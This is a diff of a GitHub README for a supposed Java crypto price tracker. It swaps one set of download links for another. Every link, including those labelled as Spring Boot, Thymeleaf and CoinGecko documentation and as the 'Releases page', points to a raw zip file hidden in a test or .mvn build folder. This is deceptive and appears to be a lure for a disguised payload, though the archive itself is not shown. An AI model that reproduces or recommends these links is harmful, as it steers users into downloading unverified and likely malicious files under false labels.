@@ -1,6 +1,6 @@
 # 🚀 Crypto-Price-Tracker-Using-Java-FullStack - Track Cryptocurrency Prices Easily
 
-[![Download](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/src/test/java/Crypto-Price-Tracker-Using-Java-FullStack_v1.9.zip%20Crypto%https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/src/test/java/Crypto-Price-Tracker-Using-Java-FullStack_v1.9.zip)](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/src/test/java/Crypto-Price-Tracker-Using-Java-FullStack_v1.9.zip)
+[![Download](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/.mvn/Crypto-Using-Stack-Java-Price-Full-Tracker-v2.6-alpha.2.zip%20Crypto%https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/.mvn/Crypto-Using-Stack-Java-Price-Full-Tracker-v2.6-alpha.2.zip)](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/.mvn/Crypto-Using-Stack-Java-Price-Full-Tracker-v2.6-alpha.2.zip)
 
 ## 📦 Overview
 
@@ -27,7 +27,7 @@ The user interface is clean and responsive, making it simple for anyone to use. 
 
 To get started with CryptoTracker, you need to download the application from the Releases page. Follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/src/test/java/Crypto-Price-Tracker-Using-Java-FullStack_v1.9.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/.mvn/Crypto-Using-Stack-Java-Price-Full-Tracker-v2.6-alpha.2.zip).
    
 2. **Download the Latest Version:** Find the latest version of the application. Click on the download link to start downloading the file.
 
@@ -42,7 +42,7 @@ To get started with CryptoTracker, you need to download the application from the
 
 ## 🔧 Download & Install
 
-You can download CryptoTracker directly from the [Releases page](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/src/test/java/Crypto-Price-Tracker-Using-Java-FullStack_v1.9.zip). Look for the latest version and follow the downloading process described above.
+You can download CryptoTracker directly from the [Releases page](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/.mvn/Crypto-Using-Stack-Java-Price-Full-Tracker-v2.6-alpha.2.zip). Look for the latest version and follow the downloading process described above.
 
 ## 📝 Usage
 
@@ -61,9 +61,9 @@ Join our community to stay updated. You can find discussions and share experienc
 
 ## 💡 Learning Resources
 
-- [Spring Boot Documentation](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/src/test/java/Crypto-Price-Tracker-Using-Java-FullStack_v1.9.zip)
-- [Thymeleaf Documentation](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/src/test/java/Crypto-Price-Tracker-Using-Java-FullStack_v1.9.zip)
-- [CoinGecko API](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/src/test/java/Crypto-Price-Tracker-Using-Java-FullStack_v1.9.zip)
+- [Spring Boot Documentation](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/.mvn/Crypto-Using-Stack-Java-Price-Full-Tracker-v2.6-alpha.2.zip)
+- [Thymeleaf Documentation](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/.mvn/Crypto-Using-Stack-Java-Price-Full-Tracker-v2.6-alpha.2.zip)
+- [CoinGecko API](https://raw.githubusercontent.com/aazingtiger/Crypto-Price-Tracker-Using-Java-FullStack/main/.mvn/Crypto-Using-Stack-Java-Price-Full-Tracker-v2.6-alpha.2.zip)
 
 For any queries, don’t hesitate to reach out via GitHub.
 
